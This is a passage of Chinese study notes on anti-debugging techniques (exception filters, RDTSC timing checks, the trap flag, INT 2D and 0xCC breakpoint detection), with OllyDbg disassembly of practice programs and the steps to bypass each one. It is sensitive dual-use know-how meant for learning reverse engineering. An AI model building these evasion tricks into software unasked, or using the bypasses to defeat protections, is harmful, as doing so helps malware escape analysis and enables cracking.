class="code"><pre><code class="hljs assembly">00401040     68 00104000    PUSH DynAD_SU.00401000; pTopLevelFilter = DynAD_SU.00401000<br>00401045     FF15 00804000  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.SetUnhandledExceptionFilter&gt;<br>0040104B     A3 3CCB4000    MOV DWORD PTR DS:[40CB3C],EAX; 保存Old Filter的地址<br></code></pre></td></tr></table></figure><p>在Top Level Exception Filter（401000）与Kernel32!UnhandledExceptionFilter() API设置好断点。位于401045地址处的CALL指令用来将401000地址处的函数注册为Top Level Exception Filter。‘然后强制触发异常，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401050     33C0           XOR EAX,EAX<br>00401052     8900           MOV DWORD PTR DS:[EAX],EAX<br></code></pre></td></tr></table></figure><p>若执行401052地址处的指令，程序将尝试向尚未定义的进程虚拟内存地址（0）写入值，这会引发无效的内存非法访问异常。接着，程序会在设有断点的Kernel32!UnhandledExceptionFilter()API内部自动暂停（因异常未处理，故系统要运行它），如图52-6所示。</p><blockquote><p>跟着书本调试到这里的时候发现图52-6和Window 7 展示出来的有很大不同，和XP的一致。看起来微软对这个API进行了一些修改。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324100843767.png#alt=image-20220324100843767"></p><p>请注意7C863EF1地址处的CALL ntdll!NtQueryInformationProcess()API指令，其第二个参数传入的值为ProcessDebugPort （7）。前一章中讲过，它是一种静态反调试技术，用来探测调试器。</p><blockquote><p>也就是Windows官方也使用了一定的反调试手段。</p></blockquote><p>为了继续调试，调用该函数后需要将第三个参数[EBP-124]的值（原值为FFFFFFFF）修改为0 （参考图52-7）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324101236740.png#alt=image-20220324101236740"></p><p>继续跟踪调试，出现图52-8所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324101938068.png#alt=image-20220324101938068"></p><p>7C86402F地址处的CALL EBX指令用来调用前面注册的New Top Level Exception Filter函数（401000）。接下来继续跟踪Exception Filter函数，如图52-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324103154245.png#alt=image-20220324103154245"></p><p>地址401003代码中的[40CB3C]是Old Top Level Exception Handler地址（在图52-5的代码中备份过）。在401009地址处再次调用SetUnhandledExceptionFilter()，恢复Exception Filter。401015地址处的ADD指令将EIP的值增加了4。由图52-5可知，发生异常的代码地址为401052，将该值加4变为401056。也就是说，返回Exception Filter后，继续从401056地址处执行代码（在401056地址处设置好断点后即可继续调试）。以上示例代码并不复杂，多调试几次就能充分理解其原理。</p><ul><li>破解之法</li></ul><p>利用SetUnhandledExceptionFilter()API反调试的技术综合运用了静态&amp;动态技术。因此，破解时要先使Kernel32!UnhandledExceptionFilter()（静态技术）内部调用的ntdll!NtQueryInformationProcess()API失效（使用API钩取等技术）。然后调用SetUnhandledExceptionFilter() API跟踪注册的Exception Filter,在正常运行时确定要跳到哪个地址即可。</p><blockquote><p>除上述内容外，还有许多基于异常触发的反调试技术。特别是基于SEH的反调试技术在实际中使用得非常多，希望各位通过大量练习来掌握。</p></blockquote><h1 id="52-3-Timing-Check"><a href="#52-3-Timing-Check" class="headerlink" title="52.3 Timing Check"></a>52.3 Timing Check</h1><p>在调试器中逐行跟踪程序代码比程序正常运行（非调试运行）耗费的时间要多岀很多。Timing Check技术通过计算运行时间的差异来判断进程是否处于被调试状态（参考图52-10）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324111841007.png#alt=image-20220324111841007"></p><p>基于Timing Check的反调试原理相当简单，破解之法也不难，只要直接操作获取的时间信息或比较时间的语句即可。但实际操作中，该反调试技术通常与其他反调试技术并用，导致反调试的破解过程变得异常困难（特别是这些代码不明显时，破解的难度会更大）。</p><blockquote><p>Timing Check技术也常常用作反模拟技术（Anti-Emulating）。程序在模拟器中运行时，运行速度要比程序正常运行（非模拟器中运行）慢很多，所以Timing Check技术也能用来探测程序是否在模拟器中运行。</p></blockquote><h2 id="52-3-1-时间间隔测量法"><a href="#52-3-1-时间间隔测量法" class="headerlink" title="52.3.1 时间间隔测量法"></a>52.3.1 时间间隔测量法</h2><p>测量时间间隔的方法有很多种，常用方法如下所示：</p><ol><li><strong>Counter based method</strong></li></ol><p>RDTSC</p><p>kernel32!QueryPerformanceCounter() &#x2F; ntdll!NtQueryPerformanceCounter()</p><p>kernel32!GetTickCount()</p><p>2.<br><strong>Time based method</strong></p><p>timeGetTime()</p><p>_ftime()</p><p>如代码52-4所示，测量时间间隔的方法大致分为两大类，一类是利用CPU的计数器（Counter），另一类是利用系统的实际时间（Time）。接下来学习基于RDTSC （Read Time Stamp Counter，读取时间戳计数器）的反调试技术。</p><blockquote><pre><code class="hljs">计数器的准确程度由高到低排列如下：</code></pre></blockquote><blockquote><pre><code class="hljs">RDTSC&gt;NtQueryPerformanceCounter()&gt;GetTickCount()</code></pre></blockquote><blockquote><p>NtQueryPerformanceCounter()与 GetTickCount()使用相同硬件（Performance Counter）,但二者准确程度不同（NtQueryPerformanceCounter()准确度更高）。而 RDTSC是CPU内部的计数器，其准确程度最高。基于时间的方法与基于计数器的方法在实现过程上比较类似，原理也差不多。</p></blockquote><h2 id="52-3-2-RDTSC"><a href="#52-3-2-RDTSC" class="headerlink" title="52.3.2 RDTSC"></a>52.3.2 RDTSC</h2><p>x86 CPU中存在一个名为TSC （Time Stamp Counter，时间戳计数器）的64位寄存器。CPU对</p><p>每个Clock Cycle （时钟周期）计数，然后保存到TSC。RDTSC是一条汇编指令，用来将TSC值读</p><p>入EDX:EAX寄存器（TSC大小为64位，其高32位被保存至EDX寄存器，低32位被保存至EAX寄</p><p>存器）。</p><ul><li>练习：DynAD_RDTSC.exe</li></ul><p>为了加深各位对Timing Check反调试技术的认识，下面调试示例程序（DynAD_RDTSC.exe）。 在OllyDbg调试器中打开示例程序，转到401000地址处，如图52-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324191016393.png#alt=image-20220324191016393"></p><p>下面简单介绍图52-11中的代码流（请各位亲自调试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;第一次执行RDTSC指令-将TSC保存到EDX:EAX (64位）<br>0040101CRDTSC<br><br>;将结果值放入栈<br>0040101EPUSH EDX<br>0040101FPUSH EAX<br><br>;用于消耗时间的揭环（实际代码相当复杂)<br>00401020XOR EAX,EAX<br>00401022MOV ECX,3E8<br>00401027INC EAX<br>00401028LOOPD SHORT 00401027<br><br>;第二次执行RDTSC指令<br>0040102ARDTSC<br><br>;第一次求得的TSC从栈中输入EDI:ESI<br>0040102CPOP ESI<br>0040102DPOP EDI<br><br>;比较1 - Count的high order bits<br>0040102ECMP EDX,EDI<br>00401030JA SHORT 0040103E<br><br>;比较2 - Count的low order bits<br>;若比特定值（0xFFFFFF）大，则断定处于调试状态<br>00401032SUB EAX,ESI<br>00401034MOV DWORD PTR SS:[EBP-4],EAX<br>00401037CMP EAX,0FFFFFF<br>0040103CJB SHORT 00401042<br><br>;在比较语句作用下进入异常触发代码，进程非正常终止<br>0040103EXOR EAX,EAX<br>00401040MOV DWORD PTR DS: [EAX]，EAX ;异常！ ！！ ;忽略比较语句，继续运行<br>00401042POPAD<br></code></pre></td></tr></table></figure><p>从上述代码可以看出，2次RDTSC指令调用之间存在一定的时间间隔，通过计算时间差值（Delta）来判断进程是否处于调试状态。Delta值不固定，一般在0xFFFF<del>0xFFFFFFFF之间取值。40101C</del>40102A地址间的代码区域中，只要执行1次StepInto（F7）或StepOver（F8）命令，Count的间隔就会大于0xFFFFFFFF。</p><ul><li>破解之法</li></ul><p>有几种方法可以破解以上反调试技术。</p><p>（1）不使用跟踪命令，直接使用RUN命令越过相关代码。 在40102C地址处设置断点后运行。虽然运行速度略慢于正常运行速度，但与代码跟踪相比要快很多。</p><p>（2）操作第二个RDTSC的结果值（EDX:EAX）0</p><p>操作第二个RDTSC的结果值，使之与第一个结果值相同，从而顺利通过CMP语句。</p><p>（3）操纵条件分支指令（CMP&#x2F;Jcc）。</p><p>在调试器中强制修改Flags的值，阻止执行跳转至40103E地址处。大部分Jcc指令会受CF或ZF的影响，只要修改这些标志即可控制Jcc指令。</p><p>CF与ZF全为0时，JA指令执行跳转动作。只要将CF与ZF之一的值修改为1，JA指令即失效。继续调试，40103C地址处JB指令会直接跳过异常触发代码（401040）（参考图52-12、图52-13）。</p><blockquote><p>若想学习更多有关Jcc指令分支条件的知识，请前往Intel网站参考用户手册（Intel 64 and IA-32 Architectures Software Developer’s Manual）。</p></blockquote><p>（4）利用内核模式驱动程序使RDTSC指令失效。</p><p>利用内核模式驱动程序可以从根本上使基于RDTSC的动态反调试技术失效（其实，Olly Advanced Plugin就釆用了该方法）。</p><blockquote><p>以上练习示例仅用于向各位说明相应的工作原理，所以代码都非常简单。但实际的反调试代码中，RDTSC指令与CMP&#x2F;Jcc条件分支指令并不醒目，而是巧妙地设置到代码各处，再加上与其他反调试技术（SEH、动态方法）并用，效果非常强大，破解起来也比较困难。</p></blockquote><h1 id="52-4-陷阱标志"><a href="#52-4-陷阱标志" class="headerlink" title="52.4 陷阱标志"></a>52.4 陷阱标志</h1><p>陷阱标志指EFLAGS寄存器的第九个（Index 8）比特位，如图52-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220324193142529.png#alt=image-20220324193142529"></p><h2 id="52-4-1-单步执行"><a href="#52-4-1-单步执行" class="headerlink" title="52.4.1 单步执行"></a>52.4.1 单步执行</h2><p>TF值设置为1时，CPU将进入单步执行（Single Step）模式。单步执行模式中，CPU执行1条指令后即触发1个EXCEPTION_SINGLE_STEP异常，然后陷阱标志会自动清零（0）。该EXCEPTION_SINGLE_STEP异常可以与SEH技法结合，在反调试技术中用于探测调试器。</p><ul><li>练习</li></ul><p>下面用个简单的练习来了解“修改陷阱标志进行反调试”的工作原理。首先在OllyDbg调试器中打开示例程序（DynAD_SingleStep.exe），转到401000地址处，如图52-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325140611749.png#alt=image-20220325140611749"></p><p>下面对重要的程序代码进行说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;注册SEH<br>00401011    68 36104000   PUSH 00401036<br>00401016    64:FF35 00000 PUSH DWORD PTR FS:[0]<br>0040101D    64:8925 00000 MOV DWORD PTR FS:[0],ESP                 ; Installs SE handler 401036<br><br>;通过栈修改EFLAGS寄存器（无法直接修改）<br>00401024    9C            PUSHFD;将EFLAGS寄存器的值压入栈<br>00401025    36:810C24 000 OR DWORD PTR SS:[ESP],00000100;将TF位设置为1<br>0040102D    9D            POPFD;将修改后的TF值存入EFLAGS<br><br>;执行下列指令后触发EXCEPTION_SINGLE_STEP异常<br>;1)若为正常运行，则运行前面注册过的SEH (401036)<br>;2)若为调试运行，则继续执行以下指令<br>0040102E    90            NOP<br><br>;调试运行时继续运行以下代码<br>0040102F    B8 FFFFFFFF   MOV EAX,-1<br>00401034    FFE0          JMP EAX<br></code></pre></td></tr></table></figure><p>从上述代码可以看岀，因无法直接修改EFLAGS寄存器的值，故使用PUSHFD&#x2F;POPFD指令与OR运算指令修改陷阱标志的值。 在OllyDbg调试器中继续运行程序代码到40102E地址处，如图52-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325141233619.png#alt=image-20220325141233619"></p><p>从寄存器窗口可以看到，EFLAGS寄存器（EFL）的值已经被修改为312，陷阱标志已成功设置为1 （我的系统环境下，EFLAGS的初始值为212）。从现在开始，CPU进入单步执行模式。下面执行40102E地址处的NOP指令（使用StepInto（F7）、StepOver（F8）、Run（F9）中的任意一个）。</p><p>如预想的一样，发生了EXCEPTION_SINGLE_STEP异常，如图52-17所示。</p><blockquote><p>这里不知道为什么用Ollydbg2.0的时候POPFD没能更改EFLAGS，使用Ollydbg1.0才成功</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325142421714.png#alt=image-20220325142421714"></p><p>观察图52-17中的寄存器窗口可以发现，EFLAGS寄存器（EFL）的值又变为了202。也就是说，单步执行模式下，CPU执行完1条指令后，陷阱标志即被自动清零（0）。这也意味着CPU在发生EXCEPTION_SINGLE_STEP异常后又切换至正常运行模式。如图所示，发生异常时，若程序进程非调试运行，则运行SEH执行正常代码；若程序进程处于调试中，则无法转到SEH，继续执行40102F地址处的指令。在40102F地址处执行StepInto（F7）命令，调试继续进行（请注意陷阱标志已经清零了）。然后执行401034地址处的JMP EAX （0xFFFFFFF）指令，进程非正常终止。程序的运行就像这样被分为正常运行与调试运行。</p><blockquote><p>以上示例代码耍了个“陷阱标志”花招，使进程终止执行。有时，程序中可能会包含大量类似的伪代码来迷惑代码逆向分析入员。他们调试程序时甚至都不会发现自己已经遭受反调试技术的误导，陷入伪代码调试的迷雾。经过相当一段时间的调试后才猛然发现有些不对劲，再回过头去寻找迷途之处可就不容易了。有些程序中存在着很多类似“花招”，从精神和肉体上折磨着代码逆向分析入员，防止他们调试程序。</p></blockquote><ul><li>破解之法</li></ul><p>首先，修改OllyDbg调试器选项（忽略EXCEPTION_SINGLE_STEP异常），让被调试者直接处理EXCEPTION_SINGLE_STEP异常，如图52-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325144047478.png#alt=image-20220325144047478"></p><p>然后，在注册SEH的地址处（401036）设置断点。执行40102E地址处的指令后，调试器就会停在SEH的断点处。在新的EIP地址处再次设置断点，接着运行即可跟踪正常代码（参考图52-19）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325144304737.png#alt=image-20220325144304737"></p><blockquote><p>为什么Ollydbg不能直接跟踪新的EIP呢？</p></blockquote><h2 id="52-4-2-INT-2D"><a href="#52-4-2-INT-2D" class="headerlink" title="52.4.2 INT 2D"></a>52.4.2 INT 2D</h2><p>INT 2D原为内核模式中用来触发断点异常的指令，也可以在用户模式下触发异常。但程序<strong>调试运行</strong>时<strong>不会触发异常，只是忽略</strong>。这种在正常运行与调试运行中表现出的不同可以很好地应用于反调试技术。下面调试INT 2D指令，了解其几个有趣的特征。</p><ol><li><strong>忽略下条指令的第一个字节</strong></li></ol><p>在<strong>调试模式</strong>中执行完INT 2D指令后（StepInto&#x2F;StepOver）,下条指令的第一个字节将被忽略，后一个字节会被识别为新的指令继续执行，如图52-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325144535551.png#alt=image-20220325144535551"></p><p>图52-20中，40101E地址处的INT 2D指令（CD 2D执行完后，401020地址处的<code>MOV EAX,5DEB</code>指令（B8 EB5D0000）中，第一个字节B8将被忽略（参考图52-21）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325144549288.png#alt=image-20220325144549288"></p><p>最终，401021地址处的指令被重新解析为2条指令：<code>JMP 401080</code> （EB5D）、 <code>ADD BYTE PTRDS:[EAX],AL</code> （0000）,它们完全不同于原指令<code>MOV EAX,5DEB</code>（B8 EB5D0000）。像这样，基于INT 2D的反调试技术能够形成较强的代码混淆（Obfuscated Code）效果，从而在一定程度上防止代码逆向分析入员调试程序。</p><blockquote><p>改变代码字节顺序（Code Byte Ordering）扰乱程序代码的方法称为代码混淆技术，该技术常用于动态反调试技术。</p></blockquote><ol start="2"><li><strong>—直运行到断点处</strong></li></ol><p>INT 2D指令的另一特征是，使用StepInto（F7）或StepOver（F8）命令跟踪INT 2D指令时，程序不会停在其下条指令开始的地方，而是一直运行，直到遇到断点，就像使用RUN（F9）命令运行程序一样。</p><blockquote><p>以上只是INT 2D指令在OllyDbg调试中表现出的特征，它在其他调试器中的行为略有不同。在OllyDbg调试中执行INT 2D指令后，程序不会单步暂停，而是一直运行。原因在于，执行完INT 2D指令后，原有的代码字节顺序被打乱了。也就是说，若指令在程序执行过程中改变，则程序不能单步暂停，而是一直执行，可以将其视为一种Bug。所以执行完INT 2D指令后，要想停止跟踪代码，需要事先在相应地址处设置断点。</p></blockquote><p><strong>练习：DynAD_INT 2D.exe</strong></p><p>为了帮助各位进一步了解基于INT 2D的反调试技术工作原理，下面做个简单的调试练习（DynAD_INT 2D.exe）。首先在调试器中打开示例程序，转到401000地址处，如图52-22所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325145100933.png#alt=image-20220325145100933"></p><p>程序正常运行（非调试运行）时，执行完40101E地址处的INT 2D指令后，发生异常，转去运行SEH （40102A）。在异常处理器中先把EIP值修改为401044,然后将[EBP-4]变量（局部变量[JEBP-4]是BOOL类型变量，用来检测是否存在调试器）的值设置为0 （FALSE）。然后转到401044地址处继续执行，最后执行40105B地址处的CMP&#x2F;JE条件分支指令，向控制台输岀字符串（“Not Debugging”）。</p><p>程序调试运行时，执行INT 2D指令后不会运行SEH（就像前面所说的，忽略。），而是跳过1个字节（90），继续执行401021地址处的MOV指令，将[EBP-4]变量设置为1 （TRUE），然后跳转到401044地址处继续执行，向控制台输出“Debugging”字符串。可用图52-23简单表示上面2个执行过程。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325145602875.png#alt=image-20220325145602875"></p><ul><li>破解之法</li></ul><p>我们可以从以上练习示例中看到，401044地址到40105B地址（条件分支指令（CMP&#x2F;JE））间的代码都会被执行，所以只要简单修改代码即可破解这种反调试技术。但实际的程序调试过程中，有时必须跟踪SEH逐行调试代码，此时就需要一种方法使程序执行到SEH。利用陷阱标志能够使程序轻松进入SEH执行。</p><p>首先，设置OllyDbg调试器的选项，使之忽视EXCEPTION_SINGLE_STEP异常，如图52-18所示。然后运行程序至40101E地址处，如图52-24所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325150055564.png#alt=image-20220325150055564"></p><p>如图52-24所示，调试器在40101E地址的INT 2D指令处暂停，然后在要前往的（已注册过的）SEH处（40102A）设置断点。</p><p>如图56-25所示 ，双击TF或修改EFL值（+0x100），将TF设置为1。从现在开始，CPU进入单步执行模式。单步执行模式下，CPU执行1条指令即触发异常，然后进入SEH处理（请参考前面介绍过的单步执行示例）。接下来，按F7键（Steplnto）或F8键（StepOver）执行40101E地址处的INT 2D指令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325150427284.png#alt=image-20220325150427284"></p><p>虽然执行了40101E地址处的INT 2D指令，但并未发生异常，TF的值也未变为0 （在前面的DynAD_SingleStep.exe示例中我们知道，CPU在单步模式下执行1条指令即触发异常，且TF值会清零），如图52-26所示。原因在于，INT 2D指令原为内核指令，在用户模式的调试器中不会被识别为正常指令。因此调试器在401020地址处的NOP指令处暂停。TF&#x3D;0时，跟踪INT 2D指令后，其下条指令的第一个字节会被忽略，程序继续执行；但TF&#x3D;1时，其后面的1个字节不会被忽略，代码仍被正常识别。接下来，按F7键（Steplnto）或F8键（StepOver）执行NOP指令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325150841943.png#alt=image-20220325150841943"></p><p>在单步执行模式下执行正常指令NOP后，就会触发异常，调试暂停在设有断点的SEH处，同 时TF值清零（参考图52-27）。这样我们就能进入指定SEH继续调试了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325150800839.png#alt=image-20220325150800839"></p><h1 id="52-5-0xCC-探测"><a href="#52-5-0xCC-探测" class="headerlink" title="52.5 0xCC 探测"></a>52.5 0xCC 探测</h1><p>程序调试过程中，我们一般会设置许多软件断点。断点对应的x86指令为 “0xCC”。若能检测到该指令，即可判断程序是否处于调试状态。基于这一想法的反调试技术称为 “0xCC探测”技术。</p><blockquote><p>我们需要认真思考在代码中查找断点的方法。因为0xCC既可以用作操作码，也可以用作移位值、立即数、数据、地址等。所以，“在进程内存的代码区域中只扫描0xCC”的做法并不可靠。</p></blockquote><p>图52-28中，010073AC地址处设置了断点。虽然调试器会将8B视作操作码，但被调试进程的实际内存中，8B已被修改成CC。而指令的移位值中也存在CC。因此，单纯扫描CC很难准确判断断点。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325151426556.png#alt=image-20220325151426556"></p><h2 id="52-5-1-API-断点"><a href="#52-5-1-API-断点" class="headerlink" title="52.5.1 API 断点"></a>52.5.1 API 断点</h2><p>若只调试程序中的某个局部功能，一个比较快的方法是先在程序要调用的API处设置好断点，再运行程序。运行暂停在相应断点处后，再查看存储在栈中的返回地址。“跟踪返回地址调试相应部分”的方式能够大幅缩小代码调试范围。反调试技术中，探测这些设置在API上的断点就能准确判断当前进程是否处于调试状态。一般而言，断点都设置在API代码的开始部分，所以，只要检测API代码的第一个字节是否为CC即可判断岀当前进程是否处于调试之中。</p><blockquote><p>逆向分析人员常用的API列表</p></blockquote><table><thead><tr><th><strong>[内存]</strong></th><th><strong>[文件]</strong></th><th><strong>[寄存器]</strong></th><th><strong>[网络]</strong></th><th><strong>[其他]</strong></th></tr></thead><tbody><tr><td>ReadProcessMemory</td><td>CreateFile</td><td>RegCreateKeyEx</td><td>WSAStartup</td><td>OpenProcessToken</td></tr><tr><td>WriteProcessMemory</td><td>ReadFile</td><td>RegDeleteKey</td><td>socket</td><td>OpenSCManager</td></tr><tr><td>VirtualAlloc</td><td>WriteFile</td><td>RegDeleteValue</td><td>inetaddr</td><td>ControlService</td></tr><tr><td>VirtualAllocEx</td><td>CopyFile</td><td>RegEnumKeyEx</td><td>closesocket</td><td>SetServiceStatus</td></tr><tr><td>VirtualProtect</td><td>CreateDirectory</td><td>RegQueryValueEx</td><td>getservbyname</td><td>OpenMutex</td></tr><tr><td>VirtualProtectEx</td><td>DeleteFile</td><td>RegSetValue</td><td>gethostbybname</td><td>GetProcAddress</td></tr><tr><td>VirtualQuery</td><td>MoveFile</td><td>RegSetValueEx</td><td>htons</td><td>OutputDebugString</td></tr><tr><td>VirtualQueryEx</td><td>MoveFileEx</td><td></td><td>connect</td><td>LookupPrivilegeValue</td></tr><tr><td></td><td>FindFirstFile</td><td></td><td>inethtoa</td><td>CreateService</td></tr><tr><td></td><td>FindNextFile</td><td></td><td>recv</td><td>DeleteService</td></tr><tr><td></td><td>GetFileSize</td><td></td><td>send</td><td>QueryServiceStatusEx</td></tr><tr><td></td><td>GetWindowsDirectory</td><td></td><td>HttpOpenRequest</td><td>FindWindow</td></tr><tr><td></td><td>GetSystemDirectory</td><td></td><td>HttpSendRequest</td><td>GetModuleFileNameA</td></tr><tr><td></td><td>GetFileAttributes</td><td></td><td>HttpQuerylnfo</td><td>AdjustTokenPrivileges</td></tr><tr><td></td><td>SetFileAttributes</td><td></td><td>InternetCloseHandle</td><td>OpenService</td></tr><tr><td></td><td>SetFilePointer</td><td></td><td>InternetConnect</td><td>RegisterServiceCtrlHandler</td></tr><tr><td></td><td>CreateFileMapping</td><td></td><td>InternetGetConnectedState</td><td>CreateMutex</td></tr><tr><td></td><td>MapViewOfFile</td><td></td><td>InternetOpen</td><td>LoadLibrary</td></tr><tr><td></td><td>MapViewOfFileEx</td><td></td><td>InternetOpenUrl</td><td>GetCommandLine</td></tr><tr><td></td><td>UnmapViewOfFile</td><td></td><td>InternetReadFile</td><td>…</td></tr><tr><td></td><td>_open</td><td></td><td>URLDownloadToFile</td><td></td></tr><tr><td></td><td>_write</td><td></td><td></td><td></td></tr><tr><td></td><td>_read</td><td></td><td></td><td></td></tr><tr><td></td><td>_lseek</td><td></td><td></td><td></td></tr><tr><td></td><td>_tell</td><td></td><td></td><td></td></tr></tbody></table><ul><li>练习</li></ul><p>下面以保存文件时使用的kernel32!CreateFileW()API为例，向各位介绍基于API断点检测的反调试方法。首先，在OllyDbg调试器中单击鼠标右键，依次选择Search for - Name in all modules菜单，如图52-29所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325154131550.png#alt=image-20220325154131550"></p><p>选择Name in all modules菜单后，在All name对话框中双击CreateFileW()API，然后按F2键在API代码的开始处设置好断点，如图52-30所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325154307044.png#alt=image-20220325154307044"></p><p>这样就在API代码开始的第一个字节设置好了断点（虽然在调试器中未看到代码发生改变，但其实API代码开始的第一个字节已被改为CC）。然后获取kernel32!CreateFileW() 